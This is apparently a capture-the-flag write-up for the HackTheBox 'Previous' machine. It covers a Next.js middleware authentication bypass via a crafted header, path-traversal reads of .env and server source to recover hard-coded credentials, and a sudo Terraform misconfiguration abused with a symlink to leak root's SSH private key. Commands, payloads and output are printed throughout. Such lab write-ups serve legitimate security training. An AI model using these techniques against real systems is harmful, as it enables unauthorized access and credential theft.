# Write-up: Previous @ HackTheBox

Previous is a “medium” level Linux box. We will be exploiting a vulnerable version of the Next.js framework, and then recovering hard-coded credentials by taking advantage of an arbitrary file disclosure via path traversal bug. Finally, we’ll leverage a misconfigured Terraform instance to obtain root. 

**Initial Recon**

We start with a nmap of the server.

```python
┌──(kali㉿kali)-[~]
└─$ nmap -A 10.129.242.162
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-07 17:47 EST
Nmap scan report for 10.129.242.162
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://previous.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT       ADDRESS
1   178.01 ms 10.10.16.1
2   220.17 ms 10.129.242.162

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.99 seconds
```

Two open ports - 22 and 80. This redirects to previous.htb, so we add that to our /etc/hosts file and proceed with enumeration by visiting the website on port 80.

![image.png](images/previous/frontpage.png)

Clicking “get started” or “docs” will send us to a busted login page. Let’s give feroxbuster a shot on this.

![image.png](images/previous/feroxbuster.png)

Not surprisingly, this is a Next.js server. The presence of the _next/static directory indicates that the server is in a production configuration - that will be important later. 

Visiting “Get Started,” we end up at this URL:

```bash
[http://previous.htb/api/auth/signin?callbackUrl=%2Fdocs](http://previous.htb/api/auth/signin?callbackUrl=%2Fdocs)
```

We note the /api/auth path down, which will . We have a decent idea now of the technology stack being used, but let’s see if we can get some more specifics. Wappalyzer provides us with this:

![image.png](images/previous/wapp.png)

Next.js is version 15.2.2. 

**Authentication Bypass**

OK, so we have a non-functional login page. That means we aren’t going to sqlmap our way through this one. If we start checking for vulnerabilities, we’ll find that this version of Next.js has a recent CVE.

Next.js 15.2.2 is vulnerable to [CVE-2025-29927](https://jfrog.com/blog/cve-2025-29927-next-js-authorization-bypass/). I recommend checking out the linked page for more details, but in a nutshell: on Next.js, authentication can be handled by middleware (in this case, NextAuth). The middleware is responsible for routing the user to either the login page (for an unauthenticated user) or to the destination page. Thanks to CVE-2025-29927, as the front page hints, middleware can now be an opt-out experience - with a malformed header request, we can actually bypass the authentication middleware altogether. This happens because the header in question simulates middleware processing reaching a maximum recursion depth of 5, which causes Next.js to simply stop using it. Our request will then go straight to the backend, bypassing the authentication layer altogether. We just need to add a header (per the published POC) to our requests, and poof, the login is gone.

```bash
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

Let’s load up Burp for this one. Select the “Proxy” tab and then click “Proxy settings.” Scroll down to “HTTP match and replace rules.

![image.png](images/previous/burp1/png)

Click the “add” button and let’s put our malicious header into the “replace” field.

![image.png](images/previous/burp2.png)

Visiting the /docs endpoint, we have successfully bypassed authentication.

![image.png](images/previous/docs.png)

**Shell as jeremy**

There’s not a ton going on in past the login. The website is clearly not finished. However, clicking on “explore examples” link gets us a page with this endpoint:

```bash
[http://previous.htb/api/download?example=hello-world.ts](http://previous.htb/api/download?example=hello-world.ts)
```

This is always a good pattern to look out for in CTFs, as it’s often vulnerable to arbitrary file read. We drop a modified request into Burp Repeater (which spares us from having to download and re-open the file).

![image.png](images/previous/burp3.png)

It works! Let’s try and find the .env file.

```bash
Content-Disposition: attachment; filename=../../.env
ETag: "14ro7p5qyfd4v" 
NEXTAUTH_SECRET=82a464f1c3509a81d5c973c31a23c61a
```

The secret is not very useful for us, but it’s good to know where the project root is.

If you’re like me and you aren’t very familiar with NextJS coming into this box, you will probably get pretty frustrated. Many example projects on GitHub feature very different file system structures than this one. Here’s the trick: when you build a NextJS project, it moves a lot of files around - most importantly, into the .next/ and .next/server directories. That’s where the backend server logic will live.

Our goal is to find relevant code for NextAuth. We know it will be in […nextauth].js, and we should find something useful in terms of credentials or database information in it. Our first stop is routes-manifest.json. This is a file that defines how requests to the server are sent to actual, internal code files. We navigate to `../../.next/routes-manifest.json` and find this:

```bash
"dynamicRoutes": [
{
"page": "/api/auth/[...nextauth]",
"regex": "^/api/auth/(.+?)(?:/)?$",
"routeKeys": {
"nxtPnextauth": "nxtPnextauth"
},
"namedRegex": "^/api/auth/(?<nxtPnextauth>.+?)(?:/)?$"
},
```

OK, pretty much what we expected. This does at least confirm the file structure. After a little experimentation, we navigate to `../../.next/server/pages/api/auth/[...nextauth].js`.

And success! Buried in the file, we find this:

```bash
                        session: { strategy: "jwt" },
                        providers: [
                            r.n(u)()({
                                name: "Credentials",
                                credentials: { username: { label: "User", type: "username" }, password: { label: "Password", type: "password" } },
                                authorize: async (e) => (e?.username === "jeremy" && e.password === (process.env.ADMIN_SECRET ?? "MyNameIsJeremyAndILovePancakes") ? { id: "1", name: "Jeremy" } : null),
                            }),
                        ],
```

jeremy’s password is MyNameIsJeremyAndILovePancakes. These credentials can also allow us to login via SSH. The home directory contains the user.txt flag.

```python
┌──(kali㉿kali)-[~]
└─$ ssh jeremy@previous.htb
The authenticity of host 'previous.htb (10.129.242.162)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:79: [hashed name]
    ~/.ssh/known_hosts:82: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'previous.htb' (ED25519) to the list of known hosts.
jeremy@previous.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-152-generic x86_64)

...<snip>...

Last login: Wed Jan 7 22:57:19 2026 from 10.10.16.28
jeremy@previous:~$
```

**Root**

Now that we’re on the host, let’s run `sudo -l` to see if we have any cool powers.

```bash
jeremy@previous:~$ sudo -l
[sudo] password for jeremy:
Matching Defaults entries for jeremy on previous:
	!env_reset, env_delete+=PATH, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
	
	User jeremy may run the following commands on previous:
		(root) /usr/bin/terraform -chdir\=/opt/examples apply
```

Note !env_reset. This means that our environment variables are not cleared when we run sudo. I also end up doing some other light enumeration here via LinPEAS, but nothing else interesting comes up. Let’s focus on Terraform.

First, let’s actually run the command and see what it does. 

```bash
examples_example.example: Refreshing state... [id=/home/jeremy/docker/previous/public/examples/hello-world.ts]
...
destination_path = "/home/jeremy/docker/previous/public/examples/hello-world.ts"
```

Interesting. So this seems to be updating a file within our home directory. We should look into /opt/examples and see if we can work out what exactly it’s doing. That gives us two files: `main.tf` and `terraform.tfstate`. We start with main.tf:

```bash
terraform {
  required_providers {
    examples = {
      source = "previous.htb/terraform/examples"
    }
  }
}

variable "source_path" {
  type = string
  default = "/root/examples/hello-world.ts"

  validation {
    condition = strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")
    error_message = "The source_path must contain '/root/examples/'."
  }
}

provider "examples" {}

resource "examples_example" "example" {
  source_path = var.source_path
}

output "destination_path" {
  value = examples_example.example.destination_path
}
```

There is a variable called source_path that points, by default, to /root/examples/hello-world.ts. If we can change this, we can extract a different file. The admin attempted to use some validation here, but there’s a critical misconfiguration. It only checks to see whether the path contains “/root/examples” and has no path traversal. The intended path, `/root/examples/hello-world.ts`, passes this check. But `/home/jeremy/root/examples/` *also* passes this check. Since we can’t do directory traversal, let’s try a symlink attack on root’s ssh file. (You can also skip this step and go straight for root.txt, but where’s the fun in a job half-completed?)

```bash
jeremy@previous:~$ mkdir root
jeremy@previous:~$ mkdir root/examples                                                                                                                                                                                          
jeremy@previous:~$ ln -s /root/.ssh/id_rsa root/examples/hello-world.ts
```

Now we need to actually change the source_path. We can’t modify the sudo command itself, but as I noted earlier, we can control environment variables. Let’s check Terraform’s documentation:

![image.png](images/previous/terra_var.png)

OK. No problem.

```bash
jeremy@previous:~$ export TF_VAR_source_path="/home/jeremy/root/examples/hello-world.ts"
jeremy@previous:~$ sudo /usr/bin/terraform -chdir=/opt/examples apply

...

  # examples_example.example will be updated in-place
  ~ resource "examples_example" "example" {
        id               = "/home/jeremy/docker/previous/public/examples/hello-world.ts"
      ~ source_path      = "/root/examples/hello-world.ts" -> "/home/jeremy/root/examples/hello-world.ts"
        # (1 unchanged attribute hidden)
    }
    
   ...
    
   examples_example.example: Modifications complete after 0s [id=/home/jeremy/docker/previous/public/examples/hello-world.ts]
   
...
   
jeremy@previous:~$ cat /home/jeremy/docker/previous/public/examples/hello-world.ts
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
<snip>
```

We copy the SSH key to a file on our Kali box, chmod it 600, and run:

```bash
ssh root@previous.htb -i id_rsa
```

Then we can grab the root flag.
